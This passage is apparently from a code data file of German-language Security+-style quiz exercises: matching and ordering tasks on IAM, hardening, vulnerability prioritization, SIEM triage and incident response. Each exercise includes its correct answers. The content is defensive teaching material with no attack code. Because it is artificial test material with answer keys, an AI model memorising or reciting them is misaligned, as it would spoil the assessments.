    categoryId: 'architektur',
    title: 'OT, ICS & IoT richtig einordnen',
    objective: '3.1 Architecture Models',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Die Werks-IT inventarisiert Spezialsysteme. Ordne jedem System die Klasse zu, deren Sicherheits-Eigenheiten du beachten musst.',
    evidence:
      'Inventar Werk 2:\n  A. SPS steuert die Abfuellanlage in Echtzeit\n  B. Leitstand visualisiert und steuert verteilte Pumpstationen ueber WAN\n  C. Smarte Ueberwachungskameras mit Cloud-Anbindung, Default-Passwort\n  D. Aufzugsteuerung mit festem OS-Image, Hersteller-Update nur alle 2 Jahre',
    interaction: {
      type: 'matching',
      items: [
        { left: 'A: SPS in der Echtzeit-Steuerung', right: 'ICS/PLC — Verfuegbarkeit vor Patching' },
        { left: 'B: Leitstand steuert Stationen ueber WAN', right: 'SCADA — segmentieren, Fernzugriff haerten' },
        { left: 'C: Cloud-Kameras mit Default-Passwort', right: 'IoT — Credentials aendern, eigenes VLAN' },
        { left: 'D: festes Image, seltene Updates', right: 'Embedded — kompensierende Controls noetig' },
      ],
      options: [
        'ICS/PLC — Verfuegbarkeit vor Patching',
        'SCADA — segmentieren, Fernzugriff haerten',
        'IoT — Credentials aendern, eigenes VLAN',
        'Embedded — kompensierende Controls noetig',
      ],
    },
  },
  {
    id: 'architektur-failure-modes',
    categoryId: 'architektur',
    title: 'Fail-Open oder Fail-Closed?',
    objective: '3.1 Architecture Models',
    difficulty: 'experte',
    minutes: 4,
    description:
      'Vier Sicherheitskomponenten brauchen ein definiertes Verhalten im Fehlerfall. Ordne jeder Komponente den passenden Failure-Mode samt Begruendung zu.',
    goal: 'Ziel: Sicherheit vs. Verfuegbarkeit pro Komponente bewusst abwaegen — nicht pauschal entscheiden.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Tuerschliesssystem am RZ-Notausgang', right: 'Fail-Open — Personenschutz geht vor' },
        { left: 'Inline-IPS vor dem unkritischen Gaeste-WLAN', right: 'Fail-Open — Verfuegbarkeit akzeptiert, Risiko gering' },
        { left: 'Firewall vor dem Zahlungs-Backend', right: 'Fail-Closed — kein ungefilterter Traffic' },
        { left: 'Passiver IDS-Sensor am TAP', right: 'Kein Impact — Monitoring faellt aus, Traffic laeuft' },
      ],
      options: [
        'Fail-Open — Personenschutz geht vor',
        'Fail-Open — Verfuegbarkeit akzeptiert, Risiko gering',
        'Fail-Closed — kein ungefilterter Traffic',
        'Kein Impact — Monitoring faellt aus, Traffic laeuft',
      ],
    },
  },

  // ── Identität & Zugriff (⚠️ neu generiert) ────────────────────────────────
  {
    id: 'iam-aaa',
    categoryId: 'iam',
    title: 'AAA: jeden Schritt richtig benennen',
    objective: '4.6 Identity & Access Management',
    difficulty: 'einsteiger',
    minutes: 3,
    description:
      'Ein Login-Vorgang in vier Schritten. Ordne jedem Schritt den AAA-Baustein (plus Identifikation) zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Nutzer gibt den Benutzernamen ein', right: 'Identification' },
        { left: 'Passwort + TOTP werden geprueft', right: 'Authentication' },
        { left: 'Rolle erlaubt nur Lesezugriff auf das Repo', right: 'Authorization' },
        { left: 'Zugriff wird im Audit-Log festgehalten', right: 'Accounting' },
      ],
      options: ['Identification', 'Authentication', 'Authorization', 'Accounting'],
    },
  },
  {
    id: 'iam-mfa-faktoren',
    categoryId: 'iam',
    title: 'MFA: Faktor-Kategorien sauber trennen',
    objective: '4.6 Identity & Access Management',
    difficulty: 'einsteiger',
    minutes: 3,
    description:
      'Ordne jeden Nachweis der richtigen Faktor-Kategorie zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Passphrase', right: 'Something you know' },
        { left: 'FIDO2-Hardware-Key', right: 'Something you have' },
        { left: 'Fingerabdruck', right: 'Something you are' },
        { left: 'Login nur vom Firmen-Campus erlaubt', right: 'Somewhere you are' },
      ],
      options: ['Something you know', 'Something you have', 'Something you are', 'Somewhere you are'],
    },
  },
  {
    id: 'iam-offboarding',
    categoryId: 'iam',
    title: 'Offboarding ohne Restzugriff',
    objective: '5.1 Security Program',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Ein Admin verlaesst das Unternehmen heute um 17:00. Bring die Offboarding-Schritte in die richtige Reihenfolge, damit kein Restzugriff bleibt.',
    interaction: {
      type: 'ordering',
      steps: [
        'Persoenliche Accounts deaktivieren (SSO zuerst)',
        'Uebergabe: Ownership von Systemen/Repos uebertragen',
        'Shared-Secrets rotieren (Service-Passwoerter, API-Keys)',
        'Hardware und Tokens einsammeln',
        'Zugriffs-Review: verbliebene Berechtigungen auditieren',
      ],
      correctOrder: [1, 0, 2, 3, 4],
    },
  },
  {
    id: 'iam-least-privilege',
    categoryId: 'iam',
    title: 'Least Privilege: Verstoss erkennen',
    objective: '4.6 Identity & Access Management',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Vier Berechtigungs-Befunde aus dem Access-Review. Ordne jedem Befund das verletzte Prinzip zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Praktikant hat Domain-Admin "fuer alle Faelle"', right: 'Least Privilege verletzt' },
        { left: 'Entwickler genehmigt seine eigenen Deployments', right: 'Separation of Duties verletzt' },
        { left: 'Ex-Mitarbeiter-Konto seit 90 Tagen aktiv', right: 'Offboarding/Account-Hygiene verletzt' },
        { left: 'Alle nutzen das gleiche Admin-Konto', right: 'Accountability/Individual Accounts verletzt' },
      ],
      options: [
        'Least Privilege verletzt',
        'Separation of Duties verletzt',
        'Offboarding/Account-Hygiene verletzt',
        'Accountability/Individual Accounts verletzt',
      ],
    },
  },
  {
    id: 'iam-access-control-modelle',
    categoryId: 'iam',
    title: 'RBAC, ABAC, DAC oder MAC?',
    objective: '4.6 Identity and Access Management',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Vier Zugriffssituationen aus dem IAM-Design. Ordne jedes Muster dem passenden Access-Control-Modell zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Zugriff durch Rolle "Payroll-Approver"', right: 'RBAC' },
        { left: 'Policy nutzt Abteilung, Standort, Device-Health und Uhrzeit', right: 'ABAC' },
        { left: 'Dateibesitzer teilt Ordner selbst mit Kollegen', right: 'DAC' },
        { left: 'Label "Secret" darf nur von Clearance "Secret" gelesen werden', right: 'MAC' },
      ],
      options: ['RBAC', 'ABAC', 'DAC', 'MAC'],
    },
  },
  {
    id: 'iam-conditional-access',
    categoryId: 'iam',
    title: 'Conditional Access entscheiden',
    objective: '4.6 Identity and Access Management',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Ein Policy-Set bewertet Kontextsignale. Ordne jedem Login die passende Entscheidung zu.',
    evidence:
      'Policy:\n  - Finance-App: MFA + compliant device erforderlich\n  - Admin-Portal: phishing-resistente MFA + Privileged Role erforderlich\n  - Reise-Logins mit hohem Risiko: Step-up oder block\n  - Legacy-Protokolle: block',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Finance-App, Passwort + TOTP, compliant Laptop', right: 'Erlauben' },
        { left: 'Admin-Portal, SMS-MFA, keine Admin-Rolle', right: 'Blocken' },
        { left: 'Login Berlin und 5 Minuten spaeter New York', right: 'Step-up / Risiko pruefen' },
        { left: 'IMAP Basic Auth aus dem Internet', right: 'Blocken (Legacy-Protokoll)' },
      ],
      options: ['Erlauben', 'Blocken', 'Step-up / Risiko pruefen', 'Blocken (Legacy-Protokoll)'],
    },
  },
  {
    id: 'iam-pam-jit',
    categoryId: 'iam',
    title: 'PAM/JIT-Adminzugriff',
    objective: '4.6 Identity and Access Management',
    difficulty: 'experte',
    minutes: 5,
    description:
      'Ein Admin braucht kurzfristig Root-Zugriff fuer einen Produktions-Fix. Bring den PAM/JIT-Ablauf in die richtige Reihenfolge.',
    evidence:
      'Ticket INC-8842: Datenbank-Failover haengt\n  Vorgabe: kein permanenter Admin, Session-Aufzeichnung, Genehmigung durch Service Owner.',
    interaction: {
      type: 'ordering',
      steps: [
        'Session starten, Aufzeichnung und Befehlsprotokoll aktivieren',
        'Admin stellt JIT-Antrag mit Ticket, System und Dauer',
        'Nach Ablauf Zugriff automatisch entziehen und Token widerrufen',
        'Service Owner genehmigt den begrenzten Zugriff',
        'PAM stellt kurzlebige privilegierte Session bereit',
        'Review: Aktivitaeten gegen Ticket und Change pruefen',
      ],
      correctOrder: [1, 3, 4, 0, 2, 5],
    },
  },
  {
    id: 'iam-federation-flow',
    categoryId: 'iam',
    title: 'Federation-Flow nachvollziehen',
    objective: '4.6 Identity and Access Management',
    difficulty: 'fortgeschritten',
    minutes: 5,
    description:
      'Ein SaaS-Login nutzt Federation. Ordne die Schritte so, dass klar wird, wann der Identity Provider und wann der Service Provider handelt.',
    topology: 'User -> SaaS Service Provider -> Identity Provider -> SaaS Session',
    interaction: {
      type: 'ordering',
      steps: [
        'Identity Provider authentisiert den User und ggf. MFA',
        'SaaS validiert Assertion/Token-Signatur und Claims',
        'User ruft SaaS-App auf und wird zum IdP umgeleitet',
        'SaaS erstellt Session mit Rollen aus den Claims',
        'IdP stellt signierte Assertion bzw. Token aus',
      ],
      correctOrder: [2, 0, 4, 1, 3],
    },
  },

  {
    id: 'iam-sso-protokolle',
    categoryId: 'iam',
    title: 'SAML, OIDC, OAuth oder LDAP?',
    objective: '4.6 Identity and Access Management',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Vier Integrations-Anforderungen aus dem IAM-Backlog. Ordne jeder Anforderung das passende Protokoll zu.',
    evidence:
      'Backlog:\n  A. Browser-SSO in eine Enterprise-Webapp ueber XML-Assertions des IdP\n  B. Mobile App soll im Namen des Users auf die Kalender-API zugreifen — ohne Passwort-Weitergabe\n  C. Login "Sign in with …" inkl. ID-Token mit Identitaets-Claims (JWT)\n  D. Legacy-App prueft Gruppenmitgliedschaften direkt im Verzeichnisdienst',
    interaction: {
      type: 'matching',
      items: [
        { left: 'A: XML-Assertions fuer Browser-SSO', right: 'SAML 2.0' },
        { left: 'B: delegierter API-Zugriff ohne Passwort', right: 'OAuth 2.0 (Authorization)' },
        { left: 'C: ID-Token mit Claims als JWT', right: 'OpenID Connect' },
        { left: 'D: Verzeichnis-Lookup der Gruppen', right: 'LDAP(S)' },
      ],
      options: ['SAML 2.0', 'OAuth 2.0 (Authorization)', 'OpenID Connect', 'LDAP(S)'],
    },
  },
  {
    id: 'iam-passwort-richtlinie',
    categoryId: 'iam',
    title: 'Passwort-Policy nach NIST 800-63B',
    objective: '4.6 Identity and Access Management',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Der Helpdesk eskaliert Beschwerden ueber die alte Passwort-Policy. Ordne jeder Alt-Regel die zeitgemaesse Praxis nach NIST SP 800-63B zu.',
    evidence:
      'Alte Policy (Stand 2014):\n  A. Passwortwechsel alle 60 Tage erzwungen\n  B. Pflicht: Sonderzeichen + Zahl + Gross/Klein in jedem Passwort\n  C. Maximal 16 Zeichen, Passphrasen nicht moeglich\n  D. Nach 3 Fehlversuchen dauerhafte Kontosperre, nur manuell aufhebbar',
    interaction: {
      type: 'matching',
      items: [
        { left: 'A: erzwungener 60-Tage-Wechsel', right: 'Nur bei Kompromittierungs-Verdacht wechseln' },
        { left: 'B: erzwungene Komplexitaets-Regeln', right: 'Laenge + Blocklist statt Kompositionsregeln' },
        { left: 'C: 16-Zeichen-Limit', right: 'Lange Passphrasen erlauben (64+ Zeichen)' },
        { left: 'D: dauerhafte Sperre nach 3 Versuchen', right: 'Throttling/Rate-Limit statt Hard-Lockout' },
      ],
      options: [
        'Nur bei Kompromittierungs-Verdacht wechseln',
        'Laenge + Blocklist statt Kompositionsregeln',
        'Lange Passphrasen erlauben (64+ Zeichen)',
        'Throttling/Rate-Limit statt Hard-Lockout',
      ],
    },
  },

  // ── Security Operations (⚠️ neu generiert 2026-06-11) ─────────────────────
  {
    id: 'betrieb-server-haertung',
    categoryId: 'betrieb',
    title: 'Neuen Server nach Baseline haerten',
    objective: '4.1 Securing Computing Resources',
    difficulty: 'fortgeschritten',
    minutes: 5,
    description:
      'Ein frisch installierter Webserver soll in die DMZ. Bring die Haertungs-Schritte in die richtige Reihenfolge — von der Installation bis zur Freigabe.',
    evidence:
      'OPS-Runbook:\n  - CIS-Benchmark als verbindliche Baseline vereinbart\n  - Server traegt noch Default-Konfiguration und alle Standard-Dienste',
    interaction: {
      type: 'ordering',
      steps: [
        // Strikt sequenziell: installieren -> haerten -> verifizieren ->
        // freigeben -> betreiben (Host-FW/Logging gehoeren ZUM Benchmark-Schritt,
        // sonst waere die Reihenfolge mehrdeutig).
        'Compliance-Scan gegen die Baseline laufen lassen, Abweichungen beheben',
        'Aktuelles OS-Image installieren und alle Patches einspielen',
        'In der DMZ produktiv schalten und auf Konfigurations-Drift ueberwachen',
        'CIS-Benchmark anwenden: Dienste, Default-Konten, Host-Firewall, Logging',
        'Dokumentierte Freigabe einholen',
      ],
      correctOrder: [1, 3, 0, 4, 2],
    },
  },
  {
    id: 'betrieb-wlan-sicherheit',
    categoryId: 'betrieb',
    title: 'WLAN-Modus zum Einsatzzweck',
    objective: '4.1 Securing Computing Resources',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Das Buero-WLAN wird neu aufgesetzt. Ordne jedem Einsatzzweck den passenden Sicherheits-Modus zu.',
    evidence:
      'Anforderungen:\n  A. Mitarbeiter-WLAN: Authentisierung pro User ueber RADIUS mit Zertifikaten\n  B. Buero-Gaeste: Passphrase, aber moderner Schutz gegen Offline-Cracking\n  C. Altgeraete im Lager koennen nur WPA2-Personal\n  D. Offenes Event-WLAN soll trotzdem pro Client verschluesseln',
    interaction: {
      type: 'matching',
      items: [
        { left: 'A: User-Auth via RADIUS/Zertifikat', right: 'WPA3-Enterprise (802.1X/EAP-TLS)' },
        { left: 'B: Passphrase mit modernem Schutz', right: 'WPA3-Personal (SAE)' },
        { left: 'C: Altgeraete ohne WPA3-Support', right: 'WPA2-Personal in eigenem VLAN' },
        { left: 'D: offen, aber pro Client verschluesselt', right: 'Enhanced Open (OWE)' },
      ],
      options: ['WPA3-Enterprise (802.1X/EAP-TLS)', 'WPA3-Personal (SAE)', 'WPA2-Personal in eigenem VLAN', 'Enhanced Open (OWE)'],
    },
  },
  {
    id: 'betrieb-mobile-deployment',
    categoryId: 'betrieb',
    title: 'BYOD, COPE oder CYOD?',
    objective: '4.1 Securing Computing Resources',
    difficulty: 'einsteiger',
    minutes: 4,
    description:
      'Die Mobile-Strategie wird neu aufgesetzt. Ordne jedem Geraete-Szenario das passende Deployment-Modell bzw. die MDM-Massnahme zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Privates Handy, Firmen-Apps nur im Container', right: 'BYOD mit MDM-Workprofil' },
        { left: 'Firmengeraet, private Nutzung ausdruecklich erlaubt', right: 'COPE' },
        { left: 'Mitarbeiter waehlt aus einer Liste verwalteter Firmengeraete', right: 'CYOD' },
        { left: 'Verlorenes Geraet mit Firmendaten', right: 'Remote Wipe ueber MDM' },
      ],
      options: ['BYOD mit MDM-Workprofil', 'COPE', 'CYOD', 'Remote Wipe ueber MDM'],
    },
  },
  {
    id: 'betrieb-asset-lifecycle',
    categoryId: 'betrieb',
    title: 'Asset-Lebenszyklus ohne Luecken',
    objective: '4.2 Asset Management',
    difficulty: 'einsteiger',
    minutes: 4,
    description:
      'Das Audit bemaengelt Geraete, die nie inventarisiert oder nie sauber entsorgt wurden. Bring den Asset-Lebenszyklus in die richtige Reihenfolge.',
    interaction: {
      type: 'ordering',
      steps: [
        'Nutzung ueberwachen: Ownership, Standort und Patch-Status pflegen',
        'Beschaffung: Geraet ueber den freigegebenen Prozess kaufen',
        'Sanitisieren und Entsorgung/Verwertung mit Nachweis-Zertifikat',
        'Inventarisieren: Asset-Tag, Owner und Klassifizierung in der CMDB',
        'Ausserbetriebnahme beantragen, Daten sichern bzw. migrieren',
      ],
      correctOrder: [1, 3, 0, 4, 2],
    },
  },
  {
    id: 'betrieb-vuln-priorisierung',
    categoryId: 'betrieb',
    title: 'Schwachstellen richtig priorisieren',
    objective: '4.3 Vulnerability Management',
    difficulty: 'experte',
    minutes: 5,
    description:
      'Der Wochen-Scan liefert vier Findings. Ordne jedem Finding die richtige Priorisierung zu — der CVSS-Score allein entscheidet nicht.',
    evidence:
      'Scan-Report KW 24:\n  A. CVE am Internet-Portal, CVSS 9.8, steht in der CISA-KEV-Liste\n  B. CVSS 7.5 auf internem Server, Exploit nur mit lokalem Account moeglich\n  C. CVSS 9.1 auf isoliertem Laborsystem ohne Netzanbindung\n  D. CVSS 5.3 am Webshop, aber Voraussetzung fuer eine bekannte Exploit-Kette',
    goal: 'Ziel: Exploitability, Exposition und Kontext schlagen den reinen CVSS-Score.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'A: 9.8, KEV-gelistet, internetexponiert', right: 'Sofort patchen (Emergency Change)' },
        { left: 'B: 7.5, nur mit lokalem Account', right: 'Regulaerer Patch-Zyklus' },
        { left: 'C: 9.1, aber isoliertes Laborsystem', right: 'Risiko dokumentieren, niedrige Prioritaet' },
        { left: 'D: 5.3, Teil einer Exploit-Kette', right: 'Hochstufen: Kette bewerten, zeitnah patchen' },
      ],
      options: [
        'Sofort patchen (Emergency Change)',
        'Regulaerer Patch-Zyklus',
        'Risiko dokumentieren, niedrige Prioritaet',
        'Hochstufen: Kette bewerten, zeitnah patchen',
      ],
    },
  },
  {
    id: 'betrieb-patch-notfall',
    categoryId: 'betrieb',
    title: 'Emergency-Patch ohne Blindflug',
    objective: '4.3 Vulnerability Management',
    difficulty: 'fortgeschritten',
    minutes: 5,
    description:
      'Ein aktiv ausgenutzter Zero-Day im VPN-Gateway ist bestaetigt. Bring die Remediation-Schritte in die richtige Reihenfolge.',
    evidence:
      'Vendor-Advisory:\n  - Hotfix verfuegbar; Workaround: betroffenes Feature deaktivieren\n  - CISA: aktive Ausnutzung bestaetigt (KEV)\n  - Kontext: 800 Remote-User nutzen das Gateway waehrend der Geschaeftszeit',
    interaction: {
      type: 'ordering',
      steps: [
        'Hotfix zuerst in Staging gegen die Kernfunktionen testen',
        'Exposition pruefen: betroffene Version? Feature aktiv? Logs auf IoCs sichten',
        'Emergency Change beantragen und Workaround sofort aktivieren',
        'Hotfix in Produktion ausrollen und Funktion validieren',
        'Scan wiederholen, Remediation dokumentieren, Lessons Learned festhalten',
      ],
      correctOrder: [1, 2, 0, 3, 4],
    },
  },
  {
    id: 'betrieb-scan-arten',
    categoryId: 'betrieb',
    title: 'Scan oder Pentest — was liefert was?',
    objective: '4.3 Vulnerability Management',
    difficulty: 'einsteiger',
    minutes: 4,
    description:
      'Das Management wuenscht "einen Sicherheitstest". Ordne jeder Frage die Methode zu, die sie tatsaechlich beantwortet.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Welche bekannten CVEs sind von aussen sichtbar?', right: 'Nicht-authentifizierter Vulnerability-Scan' },
        { left: 'Fehlen Patches oder Configs auf dem Server selbst?', right: 'Authentifizierter (Credentialed) Scan' },
        { left: 'Kann ein Angreifer die Luecken real verketten?', right: 'Penetrationstest' },
        { left: 'Stimmen Prozesse und Doku mit der Policy ueberein?', right: 'Audit / Assessment' },
      ],
      options: [
        'Nicht-authentifizierter Vulnerability-Scan',
        'Authentifizierter (Credentialed) Scan',
        'Penetrationstest',
        'Audit / Assessment',
      ],
    },
  },
  {
    id: 'betrieb-siem-tuning',
    categoryId: 'betrieb',
    title: 'SIEM-Alerts richtig einordnen',
    objective: '4.4 Alerting and Monitoring',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Nach dem SIEM-Rollout ertrinkt das SOC in Alarmen. Ordne jeden Fall der richtigen Bewertung zu, bevor du Regeln tunst.',
    evidence:
      'Review der letzten Schicht:\n  A. Alarm "Bruteforce" — Ausloeser war der Backup-Service mit abgelaufenem Passwort\n  B. Alarm "C2-Beacon" — bestaetigte Malware auf dem Host\n  C. Kein Alarm — der Phishing-Login aus dem Ausland blieb unentdeckt\n  D. Kein Alarm — und tatsaechlich kein Vorfall im Zeitraum',
    interaction: {
      type: 'matching',
      items: [
        { left: 'A: Alarm ohne echten Angriff', right: 'False Positive — Regel tunen/Allowlist' },
        { left: 'B: Alarm mit bestaetigtem Vorfall', right: 'True Positive — Incident eroeffnen' },
        { left: 'C: Vorfall ohne Alarm', right: 'False Negative — Detection-Luecke schliessen' },
        { left: 'D: kein Alarm, kein Vorfall', right: 'True Negative — alles korrekt' },
      ],
      options: [
        'False Positive — Regel tunen/Allowlist',
        'True Positive — Incident eroeffnen',
        'False Negative — Detection-Luecke schliessen',
        'True Negative — alles korrekt',
      ],
    },
  },
  {
    id: 'betrieb-monitoring-werkzeuge',
    categoryId: 'betrieb',
    title: 'Das richtige Monitoring-Werkzeug',
    objective: '4.4 Alerting and Monitoring',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Fuenf Monitoring-Fragen aus dem SOC-Backlog. Ordne jeder Frage die Datenquelle bzw. das Werkzeug zu, das sie beantwortet.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Wer redet mit wem? Flow-Metadaten statt Paketinhalt', right: 'NetFlow/IPFIX' },
        { left: 'Sind alle Hosts konform zur Haertungs-Baseline?', right: 'SCAP-Compliance-Scan' },
        { left: 'Verlassen sensible Daten das Haus per Mail oder USB?', right: 'DLP' },
        { left: 'Geraet meldet selbststaendig eine Statusaenderung', right: 'SNMP-Trap' },
        { left: 'Logs aus allen Quellen korrelieren und alarmieren', right: 'SIEM' },
      ],
      options: ['NetFlow/IPFIX', 'SCAP-Compliance-Scan', 'DLP', 'SNMP-Trap', 'SIEM'],
    },
  },
  {
    id: 'betrieb-email-authentisierung',
    categoryId: 'betrieb',
    title: 'SPF, DKIM, DMARC gegen Spoofing',
    objective: '4.5 Enterprise Security',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Nach einer CEO-Fraud-Welle soll die Mail-Domain abgesichert werden. Ordne jede Schutzwirkung dem richtigen Mechanismus zu.',
    evidence:
      'DNS-Eintraege (Soll-Zustand):\n  TXT  v=spf1 ip4:203.0.113.0/24 -all\n  TXT  selector1._domainkey: DKIM-Public-Key\n  TXT  _dmarc: v=DMARC1; p=quarantine; rua=mailto:dmarc@firma.example',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Legt fest, welche Server fuer die Domain senden duerfen', right: 'SPF' },
        { left: 'Signiert die Mail; Empfaenger prueft die Integritaet', right: 'DKIM' },
        { left: 'Policy bei SPF/DKIM-Fail plus Reporting', right: 'DMARC' },
        { left: 'Verschluesselt den Transport zwischen Mailservern', right: 'TLS (Transportverschluesselung)' },
      ],
      options: ['SPF', 'DKIM', 'DMARC', 'TLS (Transportverschluesselung)'],
    },
  },
  {
    id: 'betrieb-soar-playbook',
    categoryId: 'betrieb',
    title: 'SOAR-Playbook: Phishing automatisiert',
    objective: '4.7 Automation and Orchestration',
    difficulty: 'experte',
    minutes: 5,
    description:
      'Gemeldete Phishing-Mails sollen kuenftig automatisiert abgearbeitet werden. Bring die Playbook-Schritte in die richtige Reihenfolge.',
    goal: 'Ziel: Anreicherung vor Entscheidung; der Mensch uebernimmt nur noch den unklaren Sonderfall (Human-in-the-Loop).',
    interaction: {
      type: 'ordering',
      steps: [
        'Bei bestaetigten Treffern: Mail aus allen Postfaechern ziehen, URL/Domain blocken',
        'Anhaenge und URLs automatisch in der Sandbox detonieren',
        'Eingang: SOAR parst die gemeldete Mail zu einem Ticket (Hashes, URLs, Header)',
        'Verbleibende unklare Faelle mit gesammeltem Kontext an einen Analysten eskalieren',
        'IoCs gegen Threat-Intel-Feeds und EDR-Telemetrie anreichern',
      ],
      correctOrder: [2, 4, 1, 0, 3],
    },
  },
  {
    id: 'betrieb-automation-usecases',
    categoryId: 'betrieb',
    title: 'Automatisieren — aber das Richtige',
    objective: '4.7 Automation and Orchestration',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Das Ops-Team sammelt Automatisierungs-Ideen. Ordne jeder Idee den primaeren Nutzen — oder das Risiko — zu.',
    evidence:
      'Ideen-Backlog:\n  A. User-On-/Offboarding per Skript ans HR-System koppeln\n  B. Ticket-Eskalation ab Severity HIGH automatisch ans On-Call\n  C. Komplette Produktions-Firewall-Policy naechtlich per Skript neu schreiben\n  D. Guardrail: Pipeline stoppt das Deployment, wenn Security-Tests fehlschlagen',
    interaction: {
      type: 'matching',
      items: [
        { left: 'A: On-/Offboarding an HR koppeln', right: 'Provisioning ohne Restzugriffe und Liegezeiten' },
        { left: 'B: Auto-Eskalation ab HIGH', right: 'Schnellere Reaktion, weniger Alert-Fatigue' },
        { left: 'C: Prod-Policy naechtlich neu schreiben', right: 'Riskant: Single Point of Failure ohne Review' },
        { left: 'D: Deployment-Stopp bei Test-Fail', right: 'Guardrail erzwingt Security im SDLC' },
      ],
      options: [
        'Provisioning ohne Restzugriffe und Liegezeiten',
        'Schnellere Reaktion, weniger Alert-Fatigue',
        'Riskant: Single Point of Failure ohne Review',
        'Guardrail erzwingt Security im SDLC',
      ],
    },
  },

  // ── Incident Response (Schwerpunkt; ⚠️ neu generiert) ─────────────────────
  {
    id: 'ir-nist-phasen',
    categoryId: 'incident-response',
    title: 'NIST-IR-Lebenszyklus in Reihenfolge',
    objective: '4.8 Incident Response',
    difficulty: 'einsteiger',
    minutes: 3,
    description:
      'Bring die Phasen des NIST-Incident-Response-Lebenszyklus in die korrekte Reihenfolge.',
    interaction: {
      type: 'ordering',
      steps: [
        'Containment',
        'Preparation',
        'Lessons Learned',
        'Detection & Analysis',
        'Recovery',
        'Eradication',
      ],
      correctOrder: [1, 3, 0, 5, 4, 2],
    },
  },
  {
    id: 'ir-ransomware-first-response',
    categoryId: 'incident-response',
    title: 'Ransomware um 03:12 — First Response',
    objective: '4.8 Incident Response',
    difficulty: 'experte',
    minutes: 5,
    description:
      'Das SOC meldet aktive Verschluesselung auf zwei Fileservern. Bring die First-Response-Schritte in die richtige Reihenfolge — Eindaemmung vor Aufklaerung, aber ohne Beweismittel zu zerstoeren.',
    evidence:
      'SOC-Alarm 03:12\n  - 2 Fileserver schreiben massenhaft .lock-Dateien\n  - SMB-Traffic vom Buchhaltungs-Client FIN-PC-07 auffaellig\n  - Backups: letzter erfolgreicher Lauf 23:30, Offsite vorhanden',
    goal: 'Ziel: Ausbreitung stoppen, Beweise sichern, sauber wiederherstellen — in dieser Prioritaet.',
    interaction: {
      type: 'ordering',
      steps: [
        // Konsistent zum goal ("Ausbreitung stoppen" zuerst): Isolation vor
        // der formalen Deklaration — bei aktiver Verschluesselung zaehlt jede Minute.
        'Forensik: Speicherabbild und Logs von FIN-PC-07 sichern',
        'Betroffene Systeme vom Netz isolieren (nicht ausschalten)',
        'Incident deklarieren, IR-Team und Kommunikationsplan aktivieren',
        'Wiederherstellung aus dem Offsite-Backup in saubere Umgebung',
        'Initialen Vektor schliessen (Patch/Credentials/Regel)',
        'Lessons Learned mit Timeline und Massnahmen dokumentieren',
      ],
      correctOrder: [1, 2, 0, 4, 3, 5],
    },
  },
  {
    id: 'ir-log-quellen',
    categoryId: 'incident-response',
    title: 'Welche Log-Quelle beantwortet die Frage?',
    objective: '4.9 Investigation Data',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Vier Ermittlungsfragen aus dem laufenden Incident. Ordne jeder Frage die Log-Quelle zu, die sie am direktesten beantwortet.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Wer hat sich wann am VPN angemeldet?', right: 'VPN-/RADIUS-Logs' },
        { left: 'Welche Domains hat der Client aufgeloest?', right: 'DNS-Resolver-Logs' },
        { left: 'Welcher Prozess hat die Datei verschluesselt?', right: 'EDR-/Endpoint-Telemetrie' },
        { left: 'Welche Regel hat den Egress-Traffic geblockt?', right: 'Firewall-Logs' },
      ],
      options: ['VPN-/RADIUS-Logs', 'DNS-Resolver-Logs', 'EDR-/Endpoint-Telemetrie', 'Firewall-Logs'],
    },
  },
  {
    id: 'ir-chain-of-custody',
    categoryId: 'incident-response',
    title: 'Chain of Custody lueckenlos halten',
    objective: '4.9 Investigation Data',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Eine Festplatte soll als Beweismittel gesichert werden. Bring die Schritte in die Reihenfolge, die die Chain of Custody lueckenlos haelt.',
    interaction: {
      type: 'ordering',
      steps: [
        'Forensisches Image erstellen, Original versiegeln',
        'Asset fotografieren und Zustand dokumentieren',
        'Hash des Images berechnen und protokollieren',
        'Uebergaben im Custody-Formular gegenzeichnen',
        'Analyse ausschliesslich auf der Arbeitskopie',
      ],
      correctOrder: [1, 0, 2, 3, 4],
    },
  },
  {
    id: 'ir-severity-triage',
    categoryId: 'incident-response',
    title: 'Severity-Triage im SOC',
    objective: '4.8 Incident Response',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Vier Alerts treffen gleichzeitig ein. Ordne jeden Alert der passenden Prioritaet zu, damit das SOC zuerst den groessten Schaden begrenzt.',
    evidence:
      'Alert-Queue 08:17:\n  A. Domain-Controller meldet verdachtige LSASS-Dumps\n  B. Ein Client blockt EICAR-Testdatei aus Awareness-Uebung\n  C. Externe IP scannt Webserver-Port 443\n  D. SaaS-Admin-Login aus ungewoehnlichem Land, MFA erfolgreich',
    interaction: {
      type: 'matching',
      items: [
        { left: 'A: Credential-Dump auf Domain-Controller', right: 'P1 — kritischer Incident' },
        { left: 'B: EICAR-Test geblockt', right: 'P4 — dokumentieren/kein Incident' },
        { left: 'C: externer Portscan', right: 'P3 — beobachten/korrelieren' },
        { left: 'D: SaaS-Admin aus ungewoehnlichem Land', right: 'P2 — Account-Risiko untersuchen' },
      ],
